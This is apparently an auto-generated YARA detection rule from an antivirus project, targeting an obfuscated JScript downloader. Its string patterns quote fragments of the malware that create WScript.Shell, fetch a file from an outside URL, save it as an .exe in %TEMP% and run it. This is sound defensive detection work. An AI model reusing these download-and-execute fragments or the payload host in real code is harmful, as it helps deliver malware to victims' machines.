rule sig_20160328_abf4d8ef6f425e7266f1ed063d9e0e05 {
  meta:
    description = "datamaliciousorder - file 20160328_abf4d8ef6f425e7266f1ed063d9e0e05.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7b4ebd7d243ef0d29f5950d9c050df091c9f8494205a36af873335a960dbf9e"

  strings:
    $s1  = "function Ateczbqd() {return Qfgxpkazuz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"G84S2FFFmqOFS.exe\";};" fullword ascii
    $s2  = "Qrklxzvon[Uirnfpf](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Gsjqzsiiks](Gfnnqtqxrz() * 11)} while (Qrklxzvon[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qfgxpkazuz = function Mddlfz() {return WScript[Oxnpb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ivezf(Anfqosnj, Rfzlmamfg){return Anfqosnj - Rfzlmamfg;};" fullword ascii
    $s6  = "function Ljqysu(Hpdoau){Qfgxpkazuz[\"Run\"](Hpdoau, Nemntr, Nemntr);};" fullword ascii
    $s7  = "function Gapvbjcps() {return ((Gyfxfoke == true) && (Gyfxfoke == Dwqpqvfaeh)) ? 1 : Nemntr;};" fullword ascii
    $s8  = "function Vnjii(){return Oxnpb;};" fullword ascii
    $s9  = "function Vatxry()" fullword ascii
    $s10 = "var Msqsgqbvfk = false;" fullword ascii
    $s11 = "function Liccy(){return Udfej;};" fullword ascii
    $s12 = "return Ivezf(Ksaysvm, Gifxrpcdtk);" fullword ascii
    $s13 = "Gyfxfoke = true; " fullword ascii
    $s14 = "Dwqpqvfaeh = true; " fullword ascii
    $s15 = "var Dwqpqvfaeh = false;" fullword ascii
    $s16 = "function Jlqnap(Nxeeakoyw) {var Ouclmgvj = (1, 2, 3, 4, 5, Nxeeakoyw); return Ouclmgvj;};" fullword ascii
    $s17 = "function Gfnnqtqxrz(){return 22;};" fullword ascii
    $s18 = "var Ckqwgeysga = new this[\"Date\"]();" fullword ascii
    $s19 = " while (Itjppvnaf){" fullword ascii
    $s20 = "var Gyfxfoke = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}